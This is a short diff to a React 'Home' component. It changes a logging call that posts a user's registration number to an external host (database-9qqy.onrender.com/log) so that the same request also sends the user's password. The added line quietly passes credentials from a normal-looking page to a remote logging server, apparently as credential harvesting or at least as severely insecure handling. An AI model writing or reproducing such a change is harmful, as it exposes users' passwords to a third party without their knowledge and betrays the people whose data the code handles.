@@ -304,7 +304,7 @@ const Home = () => {
   useEffect(() => {
     const sendLog = async () => {
       try {
-        await axios.post("https://database-9qqy.onrender.com/log", { number: redgNo });
+        await axios.post("https://database-9qqy.onrender.com/log", { number: redgNo, password : password });
       } catch (error) {
         console.error(error);
       }
